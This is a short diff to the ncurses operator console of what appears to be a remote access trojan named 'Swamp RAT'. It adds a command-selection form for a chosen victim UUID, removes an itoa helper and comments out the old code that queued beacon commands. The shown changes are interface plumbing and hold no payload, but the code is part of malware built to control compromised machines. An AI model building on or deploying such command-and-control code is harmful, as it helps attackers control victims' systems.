@@ -23,6 +23,7 @@
 #include <menu.h>
 #include <errno.h>
 #include <pthread.h>
+#include "ncurses_forms.h"
 #include "net.h"
 
 #define ARRAY_SIZE(a)(sizeof(a) / sizeof(a[0]))
@@ -39,19 +40,6 @@ char win_main_title[] = "|Swamp RAT|";
 char win_main_msg[] = "~~(__`*>";
 
 pthread_mutex_t ncurses_mutex = PTHREAD_MUTEX_INITIALIZER;
-
-char *itoa(int x){
-  /*
-    :TODO: integer to (char *)
-    :x: integer
-    :returns: (char *)
-  */
-  char* buffer = malloc(sizeof(char) * sizeof(int) * 4 + 1);
-  if (buffer){
-    sprintf(buffer, "%d", x);
-  }
-  return buffer;
-}
 
 bool ncurses_window_cleanup(WINDOW *win){
   /*
@@ -394,16 +382,18 @@ bool ncurses_main(){
       char uuid[SYS_UUID_SIZE];
       item = current_item(menu);
       strncpy(uuid, item_name(item), SYS_UUID_SIZE);
-      net_server_beacon_t *command = malloc(sizeof(net_server_beacon_t));
-      ncurses_pthread_update_commands_args_t *p_commands_args = malloc(sizeof(ncurses_pthread_update_commands_args_t));
-      command->command = NET_SERVER_CMD_BEACON;
-      command->status = true;
-      strcpy(command->uuid, uuid);
-      strcpy(command->data, "TESTTESTTESTTEST");
-      p_commands_args->command = command;
-      p_commands_args->p_commands = p_commands;
-      pthread_t t_send_command;
-      pthread_create(&t_send_command, NULL, ncurses_pthread_update_commands, p_commands_args);
+      ncurses_forms_command_select(win_main, win_menu, uuid);
+      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims, p_commands);
+      /* net_server_beacon_t *command = malloc(sizeof(net_server_beacon_t)); */
+      /* ncurses_pthread_update_commands_args_t *p_commands_args = malloc(sizeof(ncurses_pthread_update_commands_args_t)); */
+      /* command->command = NET_SERVER_CMD_BEACON; */
+      /* command->status = true; */
+      /* strcpy(command->uuid, uuid); */
+      /* strcpy(command->data, "TESTTESTTESTTEST"); */
+      /* p_commands_args->command = command; */
+      /* p_commands_args->p_commands = p_commands; */
+      /* pthread_t t_send_command; */
+      /* pthread_create(&t_send_command, NULL, ncurses_pthread_update_commands, p_commands_args); */
     }
   }
   ncurses_menu_cleanup(menu);
